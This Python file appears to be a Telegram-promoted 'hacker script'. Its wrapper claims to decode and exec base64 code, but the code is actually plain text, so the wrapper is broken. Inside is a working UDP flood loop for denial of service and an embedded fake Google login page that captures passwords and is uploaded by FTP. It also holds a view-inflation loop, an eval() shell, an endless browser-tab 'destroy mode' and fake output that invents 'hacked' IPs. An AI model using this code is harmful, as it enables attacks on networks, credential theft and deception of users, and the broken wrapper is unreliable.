import base64

# Encoded code
encoded_code = "import random
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from termcolor import colored
import time
import pickle, os
import os
import sys
import socket
from colorama import init, Fore
import webbrowser
import pyfiglet
import ftplib
import pip
import base64
init()
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
def openterminal ():
    print(colored("000                     000\n 000                   000\n  000                 000\n   000               000\n   000000000000000000000\n   0000     0000    0000\n   0000     0000    0000\n   000000000000000000000\n   000000000000000000000\n     000000000000000 \n000                     000\n 000                   000\n  000                 000\n   000               000","green"))
    while True:
            inp = input (colored(">>>","green")) 
            pr = eval(inp)
            print(pr)
def ftpupload(filename, content, ftp_address, username, password):
    # Create a local file and write content to it
    with open(filename, 'w') as file:
        file.write(content)
    
    # Connect to the FTP server
    ftp = ftplib.FTP(ftp_address)
    ftp.login(username, password)
    
    # Upload the file to the FTP server
    with open(filename, 'rb') as file:
        ftp.storbinary(f'STOR {filename}', file)
    
    # Close the FTP connection and remove the local file
    ftp.quit()
    os.remove(filename)


def banner():
    # Fancy logo
    b = [
        '╔════╦╗╔═╦╗╔═╦╗──╔╦════╦═══╦═══╗',
        '║╔╗╔╗║║║╔╣║║╔╣╚╗╔╝║╔╗╔╗║╔═╗║╔═╗║',
        '╚╝║║╚╣╚╝╝║╚╝╝╚╗╚╝╔╩╝║║╚╣╚═╝║╚══╗',
        '──║║─║╔╗║║╔╗║─╚╗╔╝──║║─║╔╗╔╩══╗║',
        '──║║─║║║╚╣║║╚╗─║║───║║─║║║╚╣╚═╝║',
        '──╚╝─╚╝╚═╩╝╚═╝─╚╝───╚╝─╚╝╚═╩═══╝'
    ]
    for char in b:
        print(f'{random.choice(colors)}{char}{n}')
    print(f'{random.choice(colors)} MADE BY : @TKKYTRS{r}')
    print(f'{random.choice(colors)} ------OP HACKER SCRIPT {cy}')

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def main():
    clr()
    banner()
    print(colored("Select an option:\n1. HACK IP\n2. SCRAPE WEBSITE CODE\n3. OPEN ATTACK LIST\n4. Exit\n5. Join Our Channel","magenta"))
    choice = input(colored("Enter your choice: ", "green"))
    
    if choice == "1":
        age = int(input(colored("Enter A Port Num: ", "blue")))
        todayyear = 21023
        bornyear = todayyear - age
        print(colored("Found Port: ", "green"), colored(bornyear, "yellow"))
    
        luck = random.randint(1, 2)
        if luck == 1:
            print(colored("No Wrong IP Found", "green"))
        else:
            print(colored("There May Be Some Wrong IP", "red"))
    
        la = int(input(colored("Enter No. Of IPs You Want To Generate: ", "green")))
    
        time.sleep(5)
        now = datetime.now().strftime("%H:%M:%S")
        no1w = int(datetime.now().strftime("%S"))
        text = no1w + 5
        no = 0
    
        while no < la:
            ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))
            print(colored("[+] Hacked an IP:", "cyan"))
            print(colored(ip_address, "yellow"))
            now = datetime.now().strftime("%H:%M:%S")
            print(colored(now, "red"))
            no += 1
    
        b = int(input("\n ----Press 1 To Go To Main Menu \n ----Press 0  To Exit:   "))
        webbrowser.open('https://telegram.me/tkkytrsandyou')
        if b > 0:
            clr()
            banner()
            main()
           
    elif choice == "2":
    	 clr()
    	 banner()
    	 va = input(colored("Enter Website URL Or Enter 1 To Stop And Return:  ","magenta"))
    	 if va == "1":
    	 	clr()
    	 	banner()
    	 	main()
    	 else:
    	 	print("Opening The Url Please Open It And Download The Source Code")
    	 	king = "http://tkkytrslinks.rf.gd/file.php?url="+va
    	 	webbrowser.open(king)
    	 	time.sleep(5)
    	 	clr()
    	 	banner()
    	 	main()
    elif choice == "3":
    	clr()
    	banner()
    	print(colored("\nChoose One Attack Option:\n","cyan"))
    	print(colored("    [ 1 ]Traffic Adder","cyan"))
    	print(colored("    [ 2 ]DDoS","cyan"))
    	print(colored("    [ 3 ]Physing","cyan"))
    	print(colored("    [ 4 ]Exit ","magenta"))
    	ch = input(colored("\n[+] Your Choise: ","red"))
    	if ch == "1":
    		clr()
    		banner()
    		king = input(colored("  Send Me The Website Link To Add Traffic / Views (You Can Enter Youtube Vido Link, FB post Links, Insta Link Or Website Link):  ","cyan"))
    		i = 0
    		while i < 500:
    			response = requests.get(king)
    			if response.status_code == 200:
    				print(colored("+1 Request On Website","green"))
    			else:
    				print(colored("failed","red"))
    			i += 1
    			time.sleep(1)

    	elif ch == "2":
    		clr()
    		banner()
    		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    		bytes = random._urandom(1490)
    		ip =  input("IP Target : ")
    		port = int(input("Port       : "))
    		sent = 0
    		while True:
    			sock.sendto(bytes, (ip, port))
    			sent = sent + 1 
    			port = port + 1
    			print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    			if port == 65535:
    				port = 1
    	elif ch == "3":
    		clr()
    		banner()
    		print("This Function Requires FTP Info")
    		al = input("Do You Still Want To Continue , Y/N (capital letters only):")
    		if al == "Y":
    		    clr()
    		    banner()
    		    ipa = input(colored("Enter Your FTP ip/host:","red"))
    		    username = input(colored("Enter Your FTP UserName:","cyan"))
    		    pas = input(colored("Enter Your FTP Password:","red"))
    		    encoded_string = "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+R09PR0xFIExvZ2luPC90aXRsZT4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvRmlsZVNhdmVyLmpzLzIuMC4yL0ZpbGVTYXZlci5taW4uanMiPjwvc2NyaXB0PgoKICA8c3R5bGU+CiAgICBib2R5IHsKICAgICAgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOwogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICB9CiAgICAKICAgIC5jb250YWluZXIgewogICAgICBkaXNwbGF5OiBmbGV4OwogICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgaGVpZ2h0OiAxMDB2aDsKICAgIH0KICAgIAogICAgLmNhcmQgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOwogICAgICBib3gtc2hhZG93OiAwIDJweCA1cHggcmdiYSgwLCAwLCAwLCAwLjEpOwogICAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgIHBhZGRpbmc6IDQwcHg7CiAgICAgIHdpZHRoOiAzNTBweDsKICAgIH0KICAgIAogICAgLmxvZ28gewogICAgICBtYXJnaW4tdG9wOiAzMHB4OwogICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgIG1hcmdpbi1ib3R0b206IDMwcHg7CiAgICB9CiAgICAKICAgIC5sb2dvIGltZyB7CiAgICAgIGhlaWdodDogOTJweDsKICAgIH0KICAgIAogICAgLmZvcm0tZ3JvdXAgewogICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgfQogICAgCiAgICBQIHsKICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgIGZvbnQtd2VpZ2h0OiAwOwogICAgICBjb2xvcjogZ3JleTsKICAgICAgbWFyZ2luLWJvdHRvbTogNXB4OwogICAgfQogICAgCiAgICBpbnB1dFt0eXBlPSJlbWFpbCJdLAogICAgaW5wdXRbdHlwZT0icGFzc3dvcmQiXSB7CiAgICAgIHdpZHRoOiAxMDAlOwogICAgICBwYWRkaW5nOiAxMHB4OwogICAgICBib3JkZXI6IDFweCBzb2xpZCBncmV5OwogICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICB9CiAgICBpbnB1dFt0eXBlPSJlbWFpbCJdOmhvdmVyLAogICAgaW5wdXRbdHlwZT0icGFzc3dvcmQiXTpob3ZlciA+IHAgewogICAgICBtYXJnaW4tYm90dG9tOiA0MHB4OwogICAgfQogICAgLnN1Ym1pdC1idG4gewogICAgICB3aWR0aDogMTAwJTsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzQyODVGNDsKICAgICAgY29sb3I6IHdoaXRlOwogICAgICBib3JkZXI6IG5vbmU7CiAgICAgIHBhZGRpbmc6IDE0cHggMjBweDsKICAgICAgbWFyZ2luLXRvcDogMjBweDsKICAgICAgZm9udC1zaXplOiAxNnB4OwogICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgIH0KICAgIAogICAgLnN1Ym1pdC1idG46aG92ZXIgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzM2N0Q2OwogICAgfQogICAgI3B3LC5lZCB7CiAgICAgIG1hcmdpbi10b3A6IDQwMHB4OwogICAgICBjb2xvcjogIzI5OTdmZmY4OwogICAgICBmb250LXdlaWdodDogNzAwOwogICAgfQogICAgLmZvb3RlciB7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgbWFyZ2luLXRvcDogNTBweDsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBjb2xvcjogIzcwNzU3YTsKICAgIH0KICAgIEBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDo2MDBweCl7CiAgICAgIC5lZCwjcHd7CiAgICAgICAgbWFyZ2luLXRvcDogMzEwcHg7CiAgICAgIH0KICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDxkaXYgY2xhc3M9ImxvZ28iPgogICAgICAgICAgPHAgc3R5bGU9ImJhY2tncm91bmQ6Z3JleTtmb250LXN0eWxlOml0YWxpYztvcGFjaXR5OjAuMztjb2xvcjpibHVlO3RleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7bWFyZ2luLWJvdHRvbTozMHB4OyI+YWNjb3VudHMuZ29vZ2xlLmNvbS8uLi4uJTJFIC0gcHJldmlldzxwPiAKICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9pbWFnZXMvYnJhbmRpbmcvZ29vZ2xlbG9nby8xeC9nb29nbGVsb2dvX2NvbG9yXzI3Mng5MmRwLnBuZyIgYWx0PSJHb29nbGUgTG9nbyI+CiAgICAgIDwvZGl2PgogIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAKICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICAgICAgICAgIAoKICAgICAgPGZvcm0gaWQ9ImVtYWlsRm9ybSI+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICA8cD5FbWFpbCBvciBwaG9uZTwvUD4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgaWQ9ImVtYWlsIiBwbGFjZWhvbGRlcj0iIiByZXF1aXJlZD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1Ym1pdC1idG4iPk5leHQ8L2J1dHRvbj4KICAgICAgICA8cCBjbGFzcz0iZWQiIG9uY2xpY2s9ImFsZXJ0KGBDb25uZWN0aW9uIFRpbWUgT3V0XG4gUGxlYXNlIFRyeSBMb2dpbmApIj5uZXcgYWNjb3VudD88L3A+CiAgICAgIDwvZm9ybT4KICAgICAgPGZvcm0gaWQ9InBhc3N3b3JkRm9ybSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgIDx1bD4KICAgICAgICAgICAgPGxpIGlkPSJpYSIgc3R5bGU9IndpZHRoOmF1dG87dGV4dC1hbGlnbjpsZWZ0O2xpc3Qtc3R5bGU6bm9uZTtib3JkZXI6M3B4IHNvbGlkIGJsYWNrO2JvcmRlci1yYWRpdXM6NTBweCI+PC9saT4KICAgICAgICAgIDwvdWw+CiAgICAgICAgICA8UCBmb3I9InBhc3N3b3JkIj5QYXNzd29yZDwvUD4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iIiByZXF1aXJlZD4KCiAgICAgICAgPC9kaXY+CiAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQtYnRuIj5TaWduIEluPC9idXR0b24+CiAgICAgICAgICAgICAgIDxwIGlkPSJwdyI+Rm9yZ290IFBhc3N3b3JkPzwvcD4gPC9mb3JtPgogICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgIDxwPk5vdCB5b3VyIGNvbXB1dGVyPyBVc2UgYSBwcml2YXRlIGJyb3dzaW5nIHdpbmRvdyB0byBzaWduIGluLjwvcD4KICAgICAgICA8cD7CqSAyMDIzIEdPT0dMRSAtIDxhIGhyZWY9IiMiPkxlYXJuIG1vcmU8L2E+PC9wPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgogIAogIDxzY3JpcHQ+CiAgICBjb25zdCBlbWFpbEZvcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChgZW1haWxGb3JtYCk7CiAgICBjb25zdCBwYXNzd29yZEZvcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChgcGFzc3dvcmRGb3JtYCk7CgogICAgZW1haWxGb3JtLmFkZEV2ZW50TGlzdGVuZXIoYHN1Ym1pdGAsIChlKSA9PiB7CiAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgZW1haWxGb3JtLnN0eWxlLmRpc3BsYXkgPSBgbm9uZWA7CiAgICAgIHBhc3N3b3JkRm9ybS5zdHlsZS5kaXNwbGF5ID0gYGJsb2NrYDsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYHBhc3N3b3JkYCkuZm9jdXMoKTsKICAgICAgYXBpKCkKICAgIH0pOwoKICAgIHBhc3N3b3JkRm9ybS5hZGRFdmVudExpc3RlbmVyKGBzdWJtaXRgLCAoZSkgPT4gewogICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgIC8vIFBlcmZvcm0gbG9naW4gb3IgZnVydGhlciBhY3Rpb25zIGhlcmUKICAgICAgLy8gRXhhbXBsZSBmaWxlIGNvbnRlbnQKbGV0IHZhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYGVtYWlsYCkudmFsdWU7CmxldCB2YTIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChgcGFzc3dvcmRgKS52YWx1ZTsKCi8vIENyZWF0ZSBhIEJsb2Igd2l0aCB0aGUgZmlsZSBjb250ZW50CmNvbnN0IGJsb2IgPSBuZXcgQmxvYihbdmErYDpgK3ZhMl0sIHsgdHlwZTogInRleHQvcGxhaW47Y2hhcnNldD11dGYtOCIgfSk7CgovLyBTYXZlIHRoZSBmaWxlIHVzaW5nIEZpbGVTYXZlci5qcwpzYXZlQXMoYmxvYiwgdmEpOwoKICAgICAgYWxlcnQoYGZhaWxlZCBwbGVhc2UgdHJ5IGJ5IG1haW4gbGlua2ApCiAgICAgCiAgICB9KTsKICAgIGZ1bmN0aW9uIGFwaSAoKSB7CiAgICAgIGxldCBsaSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpYSIpOwogICAgICBsZXQgdmEgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChgZW1haWxgKS52YWx1ZTsKICAgICAgbGkuaW5uZXJIVE1MID0gYPCfkaRgICsgdmE7CiAgICAgIHJldHVybiB2YTsKICAgIH0KICA8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cg=="
    		    decoded_bytes = base64.b64decode(encoded_string)
    		    decode = decoded_bytes.decode("utf-8")
    		    ftpupload ("index.html",decode,ipa,username,pas)
    		else:
    		    clr()
    		    banner()
    		    main()
    	else:
    		clr()
    		banner()
    		main()
    		
    elif choice == "4":
        clr()
        banner()
        exit()
    elif choice == "5":
        clr()
        banner()
        print(f'{cy}╱╱╭┳━━━┳━━┳━╮╱╭╮\n{r}╱╱┃┃╭━╮┣┫┣┫┃╰╮┃┃\n{lg}╱╱┃┃┃╱┃┃┃┃┃╭╮╰╯┃\n{r}╭╮┃┃┃╱┃┃┃┃┃┃╰╮┃┃\n{cy}┃╰╯┃╰━╯┣┫┣┫┃╱┃┃┃\n{ye}╰━━┻━━━┻━━┻╯╱╰━╯\n{w}╭━━━┳╮╱╭┳━━━┳━╮╱╭┳━╮╱╭┳━━━┳╮\n{r}┃╭━╮┃┃╱┃┃╭━╮┃┃╰╮┃┃┃╰╮┃┃╭━━┫┃\n{cy}┃┃╱╰┫╰━╯┃┃╱┃┃╭╮╰╯┃╭╮╰╯┃╰━━┫┃\n{r}┃┃╱╭┫╭━╮┃╰━╯┃┃╰╮┃┃┃╰╮┃┃╭━━┫┃╱╭╮\n{ye}┃╰━╯┃┃╱┃┃╭━╮┃┃╱┃┃┃┃╱┃┃┃╰━━┫╰━╯┃\n{r}╰━━━┻╯╱╰┻╯╱╰┻╯╱╰━┻╯╱╰━┻━━━┻━━━╯')
        webbrowser.open("https://t.me/+TQrj4dmGoctjZDE1")
    elif choice == "+df49":
        print("device destroy mode ON")
        while True:
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            webbrowser.open("https://t.me/tkkytrs")
            print("web+1")
    elif choice == "+premacc":
        response = requests.get("http://tkkytrslinks.rf.gd/acc.php");
        if response == "no accounts avilabe now":
            print(response)
        else:
            print(response)
    elif choice == "0":
        clr()
        print(f'{cy} Devloper Options ON')
        time.sleep(3)
        a = 0
        n = 1
        while n < 5:
            print(f'{te}'.join(str(random.randint(0, 27097572393939355)) for _ in range(4)))
            a += 1
            if a == 60000:
                a = 0
                print('[\e[31m\]┌─[\[\e[37m\]\T\[\e[31m\]]──\e[1;93m[root@KALI(8.9)]\e[0;31m──[\#]\n|\n\e[0;31m└─[\[\e[31m\]\e[0;35m\W\[\e[31m\]]──► \e[1;92m')
                time.sleep(3)
                n += 1
        clr()
        openterminal()
    else:
        clr()
        banner()
        main()

# Set up colors
n = Fore.RESET
lg = Fore.LIGHTGREEN_EX
r = Fore.RED
w = Fore.WHITE
cy = Fore.CYAN
pi = Fore.MAGENTA
ye = Fore.YELLOW
bl = Fore.BLUE
te = Fore.GREEN
colors = [lg, r, w, cy, pi, te, ye]
main()"
# Decode the Base64-encoded code
decoded_code = base64.b64decode(encoded_code).decode('utf-8')

# Execute the decoded code
exec(decoded_code)
